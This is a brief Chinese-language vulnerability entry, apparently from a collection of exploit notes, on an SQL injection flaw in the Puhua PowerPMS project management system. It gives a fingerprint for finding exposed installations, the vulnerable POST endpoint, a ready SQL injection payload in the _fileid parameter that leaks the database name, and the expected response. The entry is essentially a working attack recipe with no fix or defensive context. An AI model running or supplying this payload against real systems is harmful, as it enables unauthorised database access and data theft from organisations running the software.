# 普华PMSFileBrowserPdf存在SQL注入漏洞

普华 ｜ SQL注入 ｜ —
- **指纹**：`app="普华科技-PowerPMS"`
- **请求**：`POST /PowerPlat/Control/FileBrowserPdf.ashx HTTP/1.1`

**Payload**
```
_fileid=1'and db_name()>0 --
```
- **响应特征**：200